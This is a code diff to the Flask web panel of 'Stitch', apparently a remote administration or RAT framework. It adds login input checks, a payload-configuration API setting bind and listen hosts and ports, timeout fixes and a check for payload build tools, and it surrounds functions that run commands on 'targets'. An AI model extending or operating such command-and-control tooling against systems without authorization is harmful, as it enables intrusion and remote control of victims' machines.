@@ -27,6 +27,7 @@ except ImportError:
 
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
 from flask_socketio import SocketIO, emit
+from flask_socketio import request as socketio_request
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 from flask_wtf.csrf import CSRFProtect
@@ -443,9 +444,13 @@ def index():
 @limiter.limit(f"{MAX_LOGIN_ATTEMPTS} per {LOGIN_LOCKOUT_MINUTES} minutes")
 def login():
     if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '')
         client_ip = get_remote_address()
+        # Validate inputs exist
+        if not username or not password:
+            flash('Username and password are required.', 'error')
+            return render_template('login.html'), 400
         
         # Check if IP is locked out using enhanced tracking
         if is_login_locked(client_ip):
@@ -456,7 +461,7 @@ def login():
             return render_template('login.html'), 429
         
         # Verify credentials
-        if username in USERS and check_password_hash(USERS[username], password):
+        if username in USERS and password and check_password_hash(USERS[username], password):
             # Successful login - clear failed attempts
             clear_failed_login_attempts(client_ip)
             session.permanent = True
@@ -815,7 +820,11 @@ def generate_payload():
         config_backup = None
         try:
             # Backup existing config if it exists
-            from Application.Stitch_Vars.globals import st_config
+            try:
+                from Application.Stitch_Vars.globals import st_config
+            except Exception as e:
+                log_debug(f"Config error: {e}", "ERROR", "Config")
+                st_config = os.path.join('Application', 'Stitch_Vars', 'stitch_config.ini')
             if os.path.exists(st_config):
                 config_backup = st_config + '.backup'
                 shutil.copy2(st_config, config_backup)
@@ -871,6 +880,28 @@ def generate_payload():
     except Exception as e:
         log_debug(f"Payload generation error: {str(e)}", "ERROR", "Payload")
         return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500
+
+
+@app.route('/api/payload/configure', methods=['POST'])
+@login_required
+def configure_payload():
+    """Set payload configuration via API"""
+    try:
+        data = request.get_json(silent=True) or {}
+        platform = data.get('platform', 'Windows')
+        from Application.stitch_pyld_config import set_payload_config
+        set_payload_config(
+            bind=data.get('bind', True),
+            bhost=data.get('bhost', '0.0.0.0'),
+            bport=str(data.get('bport', '4040')),
+            listen=data.get('listen', False),
+            lhost=data.get('lhost', ''),
+            lport=str(data.get('lport', '')),
+            section=platform
+        )
+        return jsonify({'status': 'success', 'message': 'Payload configured'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/download-payload')
 @login_required
@@ -1380,6 +1411,7 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
             else:
                 return ""  # Return empty instead of blocking
         
+        original_timeout = None
         try:
             # Set socket timeout to prevent indefinite hangs
             original_timeout = socket_conn.gettimeout()
@@ -1601,7 +1633,8 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
             builtins.input = original_input
             # Restore socket timeout
             try:
-                socket_conn.settimeout(original_timeout)
+                if original_timeout is not None:
+                    socket_conn.settimeout(original_timeout)
             except:
                 pass  # Socket may be closed
         
@@ -1758,12 +1791,12 @@ def download_file(filename):
 def handle_connect():
     if 'logged_in' not in session:
         return False
-    log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
+    log_debug(f"WebSocket connected: {socketio_request.sid}", "INFO", "WebSocket")
     emit('connection_status', {'status': 'connected'})
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")
+    log_debug(f"WebSocket disconnected: {socketio_request.sid}", "INFO", "WebSocket")
     # Prune any stale contexts opportunistically
     try:
         server = get_stitch_server()
@@ -1849,6 +1882,39 @@ if __name__ == '__main__':
     # Get configured port
     port = int(os.getenv('STITCH_WEB_PORT', '5000'))
     
+    # Build tool health check
+    def check_build_tools():
+        """Check if payload build tools are installed"""
+        tools_status = {
+            'pyinstaller': False,
+            'makeself': False,
+            'nsis': False
+        }
+        try:
+            import shutil as _shutil
+            tools_status['pyinstaller'] = _shutil.which('pyinstaller') is not None
+        except Exception:
+            pass
+        try:
+            from Application.Stitch_Vars.globals import tools_path
+            makeself_path = os.path.join(tools_path, 'makeself', 'makeself.sh')
+            tools_status['makeself'] = os.path.exists(makeself_path)
+        except Exception:
+            pass
+        tools_status['nsis'] = os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe")
+        print("=" * 75)
+        print("Payload Build Tools Status:")
+        print(f"  PyInstaller: {'✓ Installed' if tools_status['pyinstaller'] else '✗ Missing (install: pip install pyinstaller)'}")
+        print(f"  Makeself: {'✓ Available' if tools_status['makeself'] else '✗ Missing'}")
+        print(f"  NSIS: {'✓ Installed' if tools_status['nsis'] else '✗ Not available (Windows only)'}")
+        if not tools_status['pyinstaller']:
+            print("⚠️  WARNING: PyInstaller not installed - payload generation will fail")
+            print("   Install with: pip install pyinstaller")
+        print("=" * 75)
+        return tools_status
+
+    build_tools_status = check_build_tools()
+
     # Start Stitch server in background
     stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
     stitch_thread.start()
